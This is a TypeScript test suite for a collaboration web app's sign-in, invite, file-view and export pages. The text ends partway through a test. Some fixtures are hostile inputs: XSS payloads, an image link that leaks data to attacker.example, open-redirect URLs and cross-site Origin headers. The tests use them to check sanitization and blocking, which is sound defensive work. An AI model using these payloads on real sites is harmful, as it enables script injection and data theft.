// A port of go/adapters/web/web_test.go, against the real services: the
// ether core on an in-memory database, AuthService, and a mailer that keeps
// what it sends. The app is driven with app.request.

import assert from 'node:assert/strict'
import { createHash } from 'node:crypto'
import { test } from 'node:test'
import { unzipSync } from 'fflate'
import type { Hono } from 'hono'
import { newTestService, type TestService } from '../../core/ether/testing.ts'
import type { Account, Actor } from '../../core/ether/index.ts'
import { discardLogger } from '../../core/log.ts'
import { AuthService, CODES_PER_EMAIL_PER_HOUR, MAX_ATTEMPTS } from '../auth/index.ts'
import type { Mailer, Message } from '../mail/index.ts'
import { OAuthServer } from '../oauth/index.ts'
import { createWebApp, SESSION_COOKIE } from './index.ts'
import { safeNext } from './web.ts'

class CaptureMailer implements Mailer {
  sent: Message[] = []

  async send(m: Message): Promise<void> {
    this.sent.push(m)
  }

  lastCode(): string {
    assert.ok(this.sent.length > 0, 'no email sent')
    const m = /\b(\d{6})\b/.exec(this.sent[this.sent.length - 1].text)
    assert.ok(m, 'no code in the email')
    return m[1]
  }

  /** The code from the newest invite email to addr. */
  lastInviteCode(addr: string): string {
    for (let i = this.sent.length - 1; i >= 0; i--) {
      const m = this.sent[i]
      if (m.to !== addr) continue
      const match = /https:\/\/etherchat\.test\/invite\/([A-Z0-9-]+)/.exec(m.text)
      assert.ok(match && m.html.includes(match[0]), 'no invite link in both parts')
      return match[1]
    }
    assert.fail('no email to ' + addr)
  }
}

type Form = Record<string, string | string[]>

class Browser {
  cookies = new Map<string, string>()
  private readonly app: Hono

  constructor(app: Hono) {
    this.app = app
  }

  async do(method: string, path: string, form?: Form, headers: Record<string, string> = {}): Promise<Response> {
    const h = new Headers(headers)
    let body: string | undefined
    if (form) {
      const p = new URLSearchParams()
      for (const [k, v] of Object.entries(form)) for (const x of Array.isArray(v) ? v : [v]) p.append(k, x)
      body = p.toString()
      h.set('Content-Type', 'application/x-www-form-urlencoded')
    }
    if (this.cookies.size > 0) h.set('Cookie', [...this.cookies].map(([k, v]) => `${k}=${v}`).join('; '))
    const resp = await this.app.request(path, { method, body, headers: h })
    for (const c of resp.headers.getSetCookie()) {
      const [pair, ...attrs] = c.split('; ')
      const eq = pair.indexOf('=')
      if (attrs.includes('Max-Age=0')) this.cookies.delete(pair.slice(0, eq))
      else this.cookies.set(pair.slice(0, eq), pair.slice(eq + 1))
    }
    return resp
  }

  async page(path: string): Promise<string> {
    return (await this.do('GET', path)).text()
  }
}

// This app's own origin, as a browser sends it with a form.
const origin = { Origin: 'http://localhost' }

interface Site {
  t: TestService
  app: Hono
  auth: AuthService
  mail: CaptureMailer
  /** Moves the sign-in clock. */
  advanceAuth(ms: number): void
  browser(): Browser
  signedIn(email: string): { b: Browser; acct: Account; a: Actor }
}

function newSite(o: { timeZone?: string; oauth?: OAuthServer; t?: TestService } = {}): Site {
  const t = o.t ?? newTestService({ start: new Date() })
  const mail = new CaptureMailer()
  const auth = new AuthService(t.db, t.svc, mail, t.pepper, discardLogger)
  let authNow = Date.now()
  auth.setClock(() => new Date(authNow))
  const app = createWebApp({
    ethers: t.svc, auth, oauth: o.oauth, mailer: mail, baseUrl: 'https://etherchat.test', log: discardLogger,
    mailPreviews: false, allowCommand: '', timeZone: o.timeZone ?? 'UTC',
  })
  const site: Site = {
    t, app, auth, mail,
    advanceAuth(ms) {
      authNow += ms
    },
    browser: () => new Browser(app),
    // Allowlists email and returns a signed-in browser for it.
    signedIn(email) {
      t.svc.allow(email, '')
      const acct = t.svc.ensureAccount(email, true)
      const b = site.browser()
      b.cookies.set(SESSION_COOKIE, auth.newSession(acct.id).token)
      return { b, acct, a: { accountId: acct.id, clientId: 'test' } }
    },
  }
  return site
}

const minute = 60_000
const hour = 60 * minute

test('sign-in flow', async () => {
  const s = newSite()
  s.t.svc.allow('alice@example.com', '')
  const b = s.browser()

  let resp = await b.do('GET', '/e/abc')
  assert.equal(resp.status, 303)
  assert.ok(resp.headers.get('Location')?.startsWith('/login?next='))

  resp = await b.do('POST', '/login', { email: 'Alice@Example.com', next: '/e/abc' })
  const page = await resp.text()
  assert.equal(resp.status, 200)
  assert.ok(page.includes('Check your email'))
  assert.equal(s.mail.sent.length, 1)
  const m = s.mail.sent[0]
  assert.equal(m.to, 'alice@example.com')
  assert.ok(m.text.includes('never asks for this code') && m.html.includes('never asks for this code'))
  const code = s.mail.lastCode()

  resp = await b.do('POST', '/login/verify', { email: 'alice@example.com', code: code.slice(0, 3) + ' ' + code.slice(3), next: '/e/abc' })
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/e/abc')
  const cookie = resp.headers.getSetCookie().find((c) => c.startsWith(SESSION_COOKIE + '='))
  assert.ok(cookie)
  assert.match(cookie, /; Path=\/; Expires=[A-Z][a-z]{2}, \d\d [A-Z][a-z]{2} \d{4} \d\d:\d\d:\d\d GMT; Max-Age=\d+; HttpOnly; Secure; SameSite=Lax$/)

  let home = await b.page('/')
  assert.ok(home.includes('Your ethers') && home.includes('@alice'), home)
  // A code works once.
  resp = await b.do('POST', '/login/verify', { email: 'alice@example.com', code })
  assert.equal(resp.status, 401)

  resp = await b.do('POST', '/logout', {})
  assert.equal(resp.status, 303)
  assert.ok(resp.headers.getSetCookie().includes(`${SESSION_COOKIE}=; Path=/; Max-Age=0; HttpOnly; Secure; SameSite=Lax`))
  home = await b.page('/')
  assert.ok(home.includes('Joining an ether') && !home.includes('Your ethers'), 'after logout, / should be the landing page')
})

test('sign-in does not reveal accounts', async () => {
  const s = newSite()
  s.t.svc.allow('alice@example.com', '')
  const known = await (await s.browser().do('POST', '/login', { email: 'alice@example.com' })).text()
  const unknown = await (await s.browser().do('POST', '/login', { email: 'stranger@example.com' })).text()
  const normalize = (p: string) => p.replaceAll('alice@example.com', 'X').replaceAll('stranger@example.com', 'X')
  assert.equal(normalize(known), normalize(unknown))
  assert.equal(s.mail.sent.length, 1, 'none to the stranger')
  const resp = await s.browser().do('POST', '/login', { email: 'not an email' })
  assert.equal(resp.status, 400)
  assert.ok((await resp.text()).includes('Enter a plain email address, like you@example.com.'))
})

test('code limits', async () => {
  const s = newSite()
  s.t.svc.allow('alice@example.com', '')
  const b = s.browser()
  const verify = async (code: string) => (await b.do('POST', '/login/verify', { email: 'alice@example.com', code })).status
  const wrong = (code: string) => (code === '000000' ? '000001' : '000000')

  // Five wrong guesses lock the code, even the right one fails after.
  await b.do('POST', '/login', { email: 'alice@example.com' })
  let code = s.mail.lastCode()
  for (let i = 0; i < MAX_ATTEMPTS; i++) assert.equal(await verify(wrong(code)), 401, `wrong guess ${i}`)
  assert.equal(await verify(code), 401, 'correct code after lockout')

  // Codes expire after 10 minutes.
  await b.do('POST', '/login', { email: 'alice@example.com' })
  code = s.mail.lastCode()
  s.advanceAuth(11 * minute)
  assert.equal(await verify(code), 401, 'expired code')

  // A new code supersedes the previous one.
  await b.do('POST', '/login', { email: 'alice@example.com' })
  const first = s.mail.lastCode()
  await b.do('POST', '/login', { email: 'alice@example.com' })
  const second = s.mail.lastCode()
  if (first !== second) assert.equal(await verify(first), 401, 'superseded code')

  // At most five codes per email per hour; further requests send nothing.
  s.advanceAuth(2 * hour)
  const before = s.mail.sent.length
  for (let i = 0; i < CODES_PER_EMAIL_PER_HOUR + 2; i++) await b.do('POST', '/login', { email: 'alice@example.com' })
  assert.equal(s.mail.sent.length - before, CODES_PER_EMAIL_PER_HOUR)
})

test('a disabled account loses its session', async () => {
  const s = newSite()
  const { b } = s.signedIn('alice@example.com')
  assert.equal((await b.do('GET', '/')).status, 200)
  s.t.svc.disallow('alice@example.com')
  assert.ok(!(await b.page('/')).includes('Your ethers'), 'disabled account still signed in')
})

const hostile = `# Plan

<script>alert(1)</script>
<img src=x onerror=alert(2)>

[click](javascript:alert(3)) and [docs](https://example.com/docs) and [sibling](other.md)

![tracker](https://attacker.example/leak.png?d=secret)
`

test('ether pages', async () => {
  const s = newSite()
  const { b: alice, a } = s.signedIn('alice@example.com')
  const e = s.t.svc.createEther(a, 'Atlas <b>2026</b>')
  s.t.svc.writeFile(a, e.id, 'shared/plan.md', hostile, 0)
  s.t.svc.writeFile(a, e.id, 'shared/plan.md', hostile + '\nv2', 1)
  s.t.svc.writeFile(a, e.id, 'members/alice/Week 1 notes.txt', '<b>not bold</b>', 0)
  s.t.svc.postMessage(a, e.id, { intent: 'update', title: 'Kickoff', body: 'Hello <script>x</script> **team**' })

  // Overview: tabs, agents, and the activity feed.
  const overview = await alice.do('GET', '/e/' + e.id)
  let page = await overview.text()
  for (const want of ['>Overview<', '>Comms<', '>Shared files<', '>@alice<', 'aria-current="page">Overview',
    'wrote v2 of', 'shared/plan.md', 'Week 1 notes.txt', 'Kickoff', 'via test']) {
    assert.ok(page.includes(want), `overview is missing ${want}`)
  }
  assert.equal(overview.status, 200)
  assert.ok(!page.includes('<script>') && !page.includes('<b>2026</b>'))

  // Comms: rendered, sanitized posts.
  page = await alice.page('/e/' + e.id + '/comms')
  assert.ok(page.includes('<strong>team</strong>') && !page.includes('<script>') && page.includes('aria-current="page">Comms'))

  // Shared files: only shared/.
  page = await alice.page('/e/' + e.id + '/shared')
  assert.ok(page.includes('plan.md') && !page.includes('Week 1 notes.txt'))

  // An agent's tab: their workspace and their activity.
  page = await alice.page('/e/' + e.id + '/m/alice')
  assert.ok(page.includes('Week 1 notes.txt') && !page.includes(`href="/e/${e.id}/f/shared/plan.md">plan.md`) &&
    page.includes('aria-current="page">@alice') && page.includes('members/alice/'), page)
  assert.equal((await alice.do('GET', '/e/' + e.id + '/m/nobody')).status, 404)
  const csp = overview.headers.get('Content-Security-Policy') ?? ''
  assert.ok(csp.includes("img-src 'self'") && csp.includes("default-src 'none'"), csp)
  assert.equal(overview.headers.get('Cache-Control'), 'no-store')

  page = await alice.page('/e/' + e.id + '/f/shared/plan.md')
  for (const bad of ['<script>', 'onerror', 'javascript:']) assert.ok(!page.includes(bad), `file page contains ${bad}`)
  assert.ok(page.includes('href="https://example.com/docs" rel="noopener noreferrer nofollow"') &&
    page.includes('<span class="url">(https://example.com/docs)</span>'), 'external link not marked')
  assert.ok(page.includes('href="other.md"'), 'relative link changed')

  page = await alice.page('/e/' + e.id + '/f/shared/plan.md?v=1')
  assert.ok(page.includes('viewing version 1'), 'old version banner missing')

  let resp = await alice.do('GET', '/e/' + e.id + '/f/members/alice/Week%201%20notes.txt?raw=1')
  assert.equal(await resp.text(), '<b>not bold</b>')
  assert.equal(resp.headers.get('Content-Type'), 'text/plain; charset=utf-8')
  assert.ok(resp.headers.get('Content-Security-Policy')?.includes('sandbox'))
  resp = await alice.do('GET', '/e/' + e.id + '/d/members/alice/Week%201%20notes.txt')
  await resp.arrayBuffer()
  assert.equal(resp.headers.get('Content-Disposition'), 'attachment; filename="Week 1 notes.txt"')
  assert.equal(resp.headers.get('Content-Length'), '15')
  assert.equal(resp.headers.get('Content-Security-Policy'), "default-src 'none'; sandbox")

  page = await alice.page('/e/' + e.id + '/h/shared/plan.md')
  assert.ok(page.includes('?v=1') && page.includes('?v=2'), page)
  resp = await alice.do('GET', '/e/' + e.id + '/f/shared')
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/e/' + e.id)
  assert.equal((await alice.do('GET', '/e/' + e.id + '/f/shared/plan.md?v=zero')).status, 400)

  // Another signed-in person who isn't a member gets 404 everywhere.
  const { b: bob } = s.signedIn('bob@example.com')
  for (const p of ['', '/comms', '/shared', '/m/alice', '/f/shared/plan.md', '/export.zip', '/h/shared/plan.md']) {
    assert.equal((await bob.do('GET', '/e/' + e.id + p)).status, 404, `non-member GET ${p}`)
  }
})

test('export zip', async () => {
  const s = newSite()
  const { b: alice, a } = s.signedIn('alice@example.com')
  const e = s.t.svc.createEther(a, 'Atlas/2026')
  const files: Record<string, string> = {
    'shared/plan.md': '# Plan\nship it',
    'members/alice/notes/day1.md': 'day one',
  }
  for (const [p, c] of Object.entries(files)) s.t.svc.writeFile(a, e.id, p, c, 0)
  s.t.svc.postMessage(a, e.id, { intent: 'handoff', title: 'Handoff', body: 'Over to you.' })

  const resp = await alice.do('GET', '/e/' + e.id + '/export.zip')
  const body = new Uint8Array(await resp.arrayBuffer())
  assert.equal(resp.status, 200)
  assert.equal(resp.headers.get('Content-Type'), 'application/zip')
  assert.equal(resp.headers.get('Content-Disposition'), 'attachment; filename=Atlas-2026.zip')
  const got: Record<string, string> = {}
  for (const [name, data] of Object.entries(unzipSync(body))) {
    assert.ok(name.startsWith('Atlas-2026/') && !name.includes('..'), `bad entry name ${name}`)
    if (!name.endsWith('/')) got[name.slice('Atlas-2026/'.length)] = new TextDecoder().decode(data)
  }
  for (const [p, c] of Object.entries(files)) assert.equal(got[p], c, p)
  assert.ok(got['board.md'].includes('Handoff') && got['board.md'].includes('Over to you.'), got['board.md'])
  assert.ok(got['requests.md'].includes('No requests.'))
  const m = JSON.parse(got['manifest.json'])
  assert.equal(m.files.length, Object.keys(files).length)
  assert.equal(m.owner, '@alice')
  for (const f of m.files) {
    assert.equal(f.sha256, createHash('sha256').update(files[f.path]).digest('hex'))
    assert.equal(f.author, '@alice')
    assert.equal(f.version, 1)
    assert.equal(f.client, 'test')
  }
  assert.ok(got['manifest.json'].endsWith('}\n') && got['manifest.json'].includes('\n  "ether_id": '))
})

test('cross-site posts are rejected', async () => {
  const s = newSite()
  const { b } = s.signedIn('alice@example.com')
  let resp = await b.do('POST', '/logout', {}, { 'Sec-Fetch-Site': 'cross-site' })
  assert.equal(resp.status, 403)
  assert.equal(await resp.text(), 'cross-origin request detected from Sec-Fetch-Site header\n')
  assert.equal((await b.do('GET', '/')).status, 200, 'session should survive a rejected cross-site logout')
  // Without Sec-Fetch-Site, the Origin has to match the Host.
  resp = await b.do('POST', '/logout', {}, { Origin: 'https://evil.example' })
  assert.equal(resp.status, 403)
  assert.equal((await b.do('POST', '/account/emails', {}, { 'Sec-Fetch-Site': 'same-origin', Origin: 'https://evil.example' })).status, 303)
  assert.equal((await b.do('POST', '/account/emails', {}, origin)).status, 303)
  assert.equal((await b.do('POST', '/account/emails', {})).status, 303)
})

test('safeNext', () => {
  const cases: Record<string, string> = {
    '/e/abc': '/e/abc',
    '': '/',
    'https://evil.com': '/',
    '//evil.com/x': '/',
    '/\\evil.com': '/',
    '/e/abc?v=2#frag': '/e/abc?v=2#frag',
    'javascript:alert1': '/',
  }
  for (const [input, want] of Object.entries(cases)) assert.equal(safeNext(input), want, input)
})

// The handle can be picked when creating a first ether, and a bad one stops
// the form before anything is created.
test('handle change', async () => {
  const s = newSite()
  const { b, acct } = s.signedIn('alice.smith@example.com')
  const page = await b.page('/new')
  assert.ok(page.includes('name="handle" value="alice.smith"') && page.includes('placeholder="my new ether"'), page)
  assert.equal((await b.do('POST', '/ethers', { name: 'Notes', handle: 'Not Valid' }, origin)).status, 400)
  assert.equal(s.t.svc.listAllEthers().length, 0, 'ether created despite a bad handle')
  assert.equal((await b.do('POST', '/ethers', { name: 'Notes', handle: '@asmith' }, origin)).status, 303)
  assert.equal(s.t.svc.accountById(acct.id).handle, 'asmith')
  // After the first ether, the handle is fixed and the field is gone.
  assert.ok(!(await b.page('/new')).includes('name="handle"'), 'handle field offered after the first ether')
})

// A post scheduled for later doesn't show up in the activity feed (or its
// title on the overview) until it publishes.
test('activity hides scheduled posts', async () => {
  const s = newSite()
  const { b, a } = s.signedIn('alice@example.com')
  const e = s.t.svc.createEther(a, 'Team')
  s.t.svc.postMessage(a, e.id, { intent: 'update', title: 'Secret plan', body: 'x', sendAt: new Date(s.t.now().getTime() + 2 * hour) })
  assert.ok(!(await b.page('/e/' + e.id)).includes('Secret plan'), "scheduled post's title is visible before it publishes")
})

test('create an ether and invite', async () => {
  const s = newSite()
  const { b: owner } = s.signedIn('owner@example.com')

  // An address that isn't allowlisted stops the form before anything exists.
  let resp = await owner.do('POST', '/ethers', { name: 'Atlas', email: ['sam@example.com', ''] }, origin)
  let page = await resp.text()
  assert.equal(resp.status, 400)
  assert.ok(page.includes('That address can&#39;t be invited here: sam@example.com. Ask the server&#39;s admin.') &&
    !page.includes('allowlist') && !page.includes('/allow-requests') && page.includes('value="Atlas"'), page)
  assert.equal(s.t.svc.listAllEthers().length, 0, 'ether created despite the error')

  s.t.svc.allow('sam@example.com', '')
  resp = await owner.do('POST', '/ethers', { name: 'Atlas', email: ['Sam@Example.com', '', ''] }, origin)
  const loc = resp.headers.get('Location') ?? ''
  assert.equal(resp.status, 303)
  assert.ok(loc.endsWith('?n=created'), loc)
  const etherPath = loc.slice(0, -'?n=created'.length)
  page = await owner.page(loc)
  for (const want of ['The invites are on their way.', 'sam@example.com', 'Connect your AI', 'https://etherchat.test/mcp', 'withdraw']) {
    assert.ok(page.includes(want), `overview after create is missing ${want}`)
  }
  const code = s.mail.lastInviteCode('sam@example.com')
  assert.equal(s.mail.sent[s.mail.sent.length - 1].subject, 'owner@example.com invited you to "Atlas" on Etherchat')

  // Signed out, the link goes through sign-in and comes back.
  resp = await s.browser().do('GET', '/invite/' + code)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/login?next=' + encodeURIComponent('/invite/' + code))

  // Someone else signed in sees nothing about the invite.
  const { b: other } = s.signedIn('other@example.com')
  page = await other.page('/invite/' + code)
  assert.ok(page.includes("can't be used") && !page.includes('Atlas') && !page.includes('owner@example.com'), page)
  assert.equal((await other.do('POST', '/invite/' + code, { decision: 'accept' }, origin)).status, 404)

  // The invitee can look as often as they like (so can a mail scanner);
  // only the button uses the invite.
  const { b: sam, acct: samAcct } = s.signedIn('sam@example.com')
  for (let i = 0; i < 2; i++) {
    page = await sam.page('/invite/' + code)
    assert.ok(page.includes('owner@example.com invited you to their ether [Atlas].') && page.includes('name="handle"'), page)
  }
  resp = await sam.do('POST', '/invite/' + code, { decision: 'accept', handle: 'samuel' }, origin)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), etherPath + '?n=joined')
  assert.equal(s.t.svc.accountById(samAcct.id).handle, 'samuel')
  page = await sam.page(etherPath + '?n=joined')
  assert.ok(page.includes('You&#39;re in.') && page.includes('@samuel') && !page.includes('withdraw'), page)
  assert.ok((await sam.page('/invite/' + code)).includes("can't be used"), 'a used invite still shows')

  // Only fixed notices appear, whatever the link says.
  page = await sam.page(etherPath + '?n=<b>hi</b>')
  assert.ok(!page.includes('hi</b>') && !page.includes('&lt;b&gt;'), 'arbitrary notice text shown')

  // Members can invite; only the owner withdraws invites and removes people.
  s.t.svc.allow('kim@example.com', '')
  resp = await sam.do('POST', etherPath + '/invites', { email: 'kim@example.com' }, origin)
  assert.equal(resp.status, 303)
  assert.ok(resp.headers.get('Location')?.endsWith('?n=invited'))
  const kimCode = s.mail.lastInviteCode('kim@example.com')
  assert.equal((await sam.do('POST', etherPath + '/members/owner/remove', {}, origin)).status, 403)
  const invites = s.t.svc.listInvites({ accountId: samAcct.id, clientId: '' }, etherPath.slice('/e/'.length))
  assert.equal(invites.length, 1)
  assert.equal((await sam.do('POST', etherPath + '/invites/' + invites[0].id + '/revoke', {}, origin)).status, 403)
  assert.equal((await owner.do('POST', etherPath + '/invites/' + invites[0].id + '/revoke', {}, origin)).status, 303)
  const { b: kim } = s.signedIn('kim@example.com')
  assert.ok((await kim.page('/invite/' + kimCode)).includes("can't be used"), 'a withdrawn invite still shows')
  assert.equal((await owner.do('POST', etherPath + '/members/samuel/remove', {}, origin)).status, 303)
  assert.equal((await sam.do('GET', etherPath)).status, 404, 'removed member still sees the ether')
})

test('decline an invite', async () => {
  const s = newSite()
  const { b: owner, a: ownerActor } = s.signedIn('owner@example.com')
  s.t.svc.allow('sam@example.com', '')
  await owner.do('POST', '/ethers', { name: 'Side project', email: 'sam@example.com' }, origin)
  const code = s.mail.lastInviteCode('sam@example.com')

  const { b: sam } = s.signedIn('sam@example.com')
  let page = await sam.page('/')
  assert.ok(page.includes('Waiting for you') && page.includes('owner@example.com'), page)
  const resp = await sam.do('POST', '/invite/' + code, { decision: 'decline' }, origin)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/?n=declined')
  page = await sam.page('/?n=declined')
  assert.ok(page.includes('Invite declined.') && !page.includes('Waiting for you'), page)
  assert.equal((await sam.do('POST', '/invite/' + code, { decision: 'accept' }, origin)).status, 404)
  assert.equal((await sam.do('POST', '/invite/' + code, { decision: 'maybe' }, origin)).status, 400)
  const list = s.t.svc.listEthers(ownerActor)
  assert.equal(list.length, 1)
  assert.equal(list[0].members.length, 1)
})

test('directory stats', async () => {
  const s = newSite()
  const { b, a } = s.signedIn('alice@example.com')
  const e = s.t.svc.createEther(a, 'Team')
  // The second write replaces the first; only the current version counts.
  s.t.svc.writeFile(a, e.id, 'shared/a.md', 'x'.repeat(4000), 0)
  s.t.svc.writeFile(a, e.id, 'shared/a.md', 'y'.repeat(1500), 1)
  for (const title of ['one', 'two']) s.t.svc.postMessage(a, e.id, { intent: 'update', title, body: 'x' })
  const page = await b.page('/')
  assert.ok(page.includes('1.5 KB · 2 agent interactions') && page.includes('href="/new"'), page)
})

test('answer a request', async () => {
  const s = newSite()
  const { b: owner, acct: ownerAcct } = s.signedIn('owner@example.com')
  const { b: sam, acct: samAcct } = s.signedIn('sam@example.com')
  const app: Actor = { accountId: ownerAcct.id, clientId: 'chatgpt' }
  const e = s.t.svc.createEther(app, 'Atlas')
  const { code } = s.t.svc.createInvite(app, e.id, 'sam@example.com')
  s.t.svc.joinWithCode({ accountId: samAcct.id, clientId: '' }, code)
  const rq = s.t.svc.ask(app, e.id, {
    to: ['sam'], title: 'Merge the drafts?',
    body: 'Chapters **2 and 3** overlap.<script>alert(1)</script>', choices: ['Merge', 'Keep separate'],
  })
  const path = '/e/' + e.id

  assert.ok((await sam.page('/')).includes('1 request needs you'))
  let page = await sam.page(path)
  for (const want of ['Agent Requests', 'Merge the drafts?', 'from @owner ·', '<div class="well">', '<strong>2 and 3</strong>', 'open until', 'value="1">Keep separate</button>']) {
    assert.ok(page.includes(want), `sam's overview is missing ${want}`)
  }
  assert.ok(!page.includes('<script>alert'), 'agent markup ran unescaped')
  assert.ok(!(await owner.page(path)).includes('Agent Requests'), 'the asker sees the answer form')
  assert.equal((await owner.do('POST', path + '/requests/' + rq.id + '/answer', { choice: '0' }, origin)).status, 403)
  assert.equal((await sam.do('POST', path + '/requests/' + rq.id + '/answer', { choice: '7' }, origin)).status, 400)
  const bad = await sam.do('POST', path + '/requests/' + rq.id + '/answer', { choice: 'x' }, origin)
  assert.equal(bad.status, 400)
  assert.ok((await bad.text()).includes('Pick one of the choices.'))

  const resp = await sam.do('POST', path + '/requests/' + rq.id + '/answer', { choice: '1', note: 'Different weeks.' }, origin)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), path + '?n=answered')
  page = await sam.page(path + '?n=answered')
  assert.ok(!page.includes('Agent Requests') && page.includes('Answer sent.'), page)
  page = await owner.page(path + '/comms')
  assert.ok(page.includes('status answered') && page.includes('<strong>Keep separate</strong>: Different weeks.'), page)
  assert.ok((await owner.page(path)).includes('answered @owner&#39;s request:'), 'activity doesn\'t show the answer')
  assert.equal((await sam.do('POST', path + '/requests/' + rq.id + '/answer', { choice: '0' }, origin)).status, 400)

  // The zip has the requests too.
  const zip = unzipSync(new Uint8Array(await (await owner.do('GET', path + '/export.zip')).arrayBuffer()))
  const reqs = new TextDecoder().decode(Object.entries(zip).find(([n]) => n.endsWith('/requests.md'))?.[1])
  assert.ok(reqs.includes('## Merge the drafts?') && reqs.includes('Keep separate. Different weeks.'), reqs)
})

test('account email setting', async () => {
  const s = newSite()
  const { b, acct } = s.signedIn('sam@example.com')
  let page = await b.page('/account')
  assert.ok(page.includes('name="request_emails" checked') && page.includes('sam@example.com'), page)
  assert.equal((await b.do('POST', '/account/emails', {}, origin)).status, 303)
  assert.equal(s.t.svc.accountById(acct.id).requestEmails, false)
  page = await b.page('/account?n=saved')
  assert.ok(!page.includes('checked') && page.includes('Saved.'), page)
  await b.do('POST', '/account/emails', { request_emails: 'on' }, origin)
  assert.equal(s.t.svc.accountById(acct.id).requestEmails, true)
})

test('breadcrumbs and Back', async () => {
  const s = newSite()
  const { b, a } = s.signedIn('sam@example.com')
  const e = s.t.svc.createEther(a, 'Team')
  for (const p of ['members/sam/drafts/week 3.md', 'shared/notes.md']) s.t.svc.writeFile(a, e.id, p, 'x', 0)
  const id = e.id
  let page = await b.page('/e/' + id + '/f/members/sam/drafts/week%203.md')
  for (const want of [
    `<a class="back" href="/e/${id}/m/sam#d-members%2Fsam%2Fdrafts">← Back</a>`,
    `<a href="/e/${id}#agents-h">members</a>`,
    `<a href="/e/${id}/m/sam">sam</a>`,
    `<a href="/e/${id}/m/sam#d-members%2Fsam%2Fdrafts">drafts</a>`,
    '<span aria-current="page">week 3.md</span>',
  ]) {
    assert.ok(page.includes(want), `file page is missing ${want}`)
  }
  // The anchor the breadcrumb points at exists on the agent's tab.
  assert.ok((await b.page('/e/' + id + '/m/sam')).includes('id="d-members%2Fsam%2Fdrafts"'))
  page = await b.page('/e/' + id + '/f/shared/notes.md')
  assert.ok(page.includes(`<a class="back" href="/e/${id}/shared">← Back</a>`), page)
  page = await b.page('/e/' + id + '/h/shared/notes.md')
  assert.ok(page.includes(`<a class="back" href="/e/${id}/f/shared/notes.md">← Back</a>`), page)
})

test('rename an agent on the website', async () => {
  const s = newSite()
  const { b, acct } = s.signedIn('sam@example.com')
  const e = s.t.svc.createEther({ accountId: acct.id, clientId: '' }, 'Team')
  const path = '/e/' + e.id
  let page = await b.page(path)
  assert.ok(page.includes('aria-current="page">Overview') && page.includes('>@sam</a>'), page)
  assert.equal((await b.do('POST', path + '/agent-name', { name: '@owner' }, origin)).status, 400)
  assert.equal((await b.do('POST', path + '/agent-name', { name: 'Atlas' }, origin)).status, 303)
  page = await b.page(path + '?n=renamed')
  for (const want of ['/m/sam">Atlas</a>', '@sam&#39;s agent ·', 'named their agent Atlas', 'Your agent&#39;s name is saved.']) {
    assert.ok(page.includes(want), `after renaming, missing ${want}`)
  }
})

// The code page runs exactly one script, allowed by its hash; every other page allows none.
test('the code page script', async () => {
  const s = newSite()
  s.t.svc.allow('alice@example.com', '')
  const b = s.browser()
  const resp = await b.do('POST', '/login', { email: 'alice@example.com' }, origin)
  const page = await resp.text()
  const scripts = [...page.matchAll(/<script>([\s\S]*?)<\/script>/g)]
  assert.equal(scripts.length, 1)
  assert.ok(page.includes('data-otp'))
  const want = "script-src 'sha256-" + createHash('sha256').update(scripts[0][1]).digest('base64') + "'"
  const csp = resp.headers.get('Content-Security-Policy') ?? ''
  assert.ok(csp.endsWith('; ' + want) && csp.startsWith("default-src 'none'"), csp)
  for (const path of ['/', '/login']) {
    assert.ok(!(await b.do('GET', path)).headers.get('Content-Security-Policy')?.includes('script-src'), path)
  }
})

// When an invite hits addresses that can't be invited, the member can email the server's admins about them.
test('ask the admin', async () => {
  const s = newSite()
  const { b } = s.signedIn('owner@example.com')
  s.t.svc.allow('alex@example.com', '')
  s.t.svc.setAdmin('alex@example.com', true)

  let resp = await b.do('POST', '/ethers', { name: 'Atlas', email: ['prof@uni.edu', 'kim@example.com'] }, origin)
  const page = await resp.text()
  for (const want of ['These addresses can&#39;t be invited here: prof@uni.edu, kim@example.com.', 'action="/allow-requests"',
    'name="email" value="prof@uni.edu"', 'name="back" value="/new"', 'Ask the admin to allow them']) {
    assert.ok(page.includes(want), `new ether error is missing ${want}`)
  }

  const before = s.mail.sent.length
  resp = await b.do('POST', '/allow-requests', { email: ['prof@uni.edu', 'kim@example.com', 'owner@example.com', 'not an email'], back: '/new' }, origin)
  assert.equal(resp.status, 303)
  assert.equal(resp.headers.get('Location'), '/new?n=asked')
  assert.equal(s.mail.sent.length, before + 1)
  const m = s.mail.sent[s.mail.sent.length - 1]
  assert.equal(m.to, 'alex@example.com')
  assert.equal(m.subject, '@owner asked to allow 2 addresses on Etherchat')
  assert.ok(m.text.includes('allow --email prof@uni.edu') && m.text.includes('allow --email kim@example.com') &&
    !m.text.includes('owner@example.com allow') && !m.text.includes('not an email'), m.text)
  assert.ok((await b.page('/new?n=asked')).includes('Request sent to the server&#39;s admin.'))

  // An open redirect isn't possible, and requests stop after five a day.
  resp = await b.do('POST', '/allow-requests', { email: 'a@example.com', back: 'https://evil.example' }, origin)
  assert.equal(resp.headers.get('Location'), '/?n=asked')
  for (let i = 0; i < 3; i++) await b.do('POST', '/allow-requests', { email: 'a@example.com', back: '/new' }, origin)
  resp = await b.do('POST', '/allow-requests', { email: 'a@example.com', back: '/new' }, origin)
  assert.equal(resp.headers.get('Location'), '/new?n=asklimit')
})

test('activity pages and filter', async () => {
  const t0 = new Date(Date.UTC(2026, 9, 1, 12, 0, 0))
  const s = newSite({ t: newTestService({ start: t0 }) })
  const { b, a } = s.signedIn('sam@example.com')
  const e = s.t.svc.createEther(a, 'Team')
  for (let i = 1; i <= 30; i++) { // one event a minute, 12:01 to 12:30
    s.t.set(new Date(t0.getTime() + i * minute))
    s.t.svc.createFolder(a, e.id, 'shared/f' + String(i).padStart(2, '0'))
  }
  const path = '/e/' + e.id
  const events = (page: string) => page.split('<time>').length - 1

  let page = await b.page(path)
  assert.equal(events(page), 25)
  assert.ok(page.includes('page 1 of 2 · 31 events') &&
    page.includes(`href="${path}?page=2#activity-h" aria-label="Older page" title="Older">→</a>`) &&
    page.includes('<span class="arrow off" aria-hidden="true">←</span>'), page)
  page = await b.page(path + '?page=2')
  assert.equal(events(page), 6)
  assert.ok(page.includes(`href="${path}#activity-h" aria-label="Newer page" title="Newer">←</a>`) && page.includes('shared/f05/'), page)

  // 12:10 to 12:14 includes the whole 12:14 minute: five events, one page.
  page = await b.page(path + '?from=2026-10-01T12:10&to=2026-10-01T12:14')
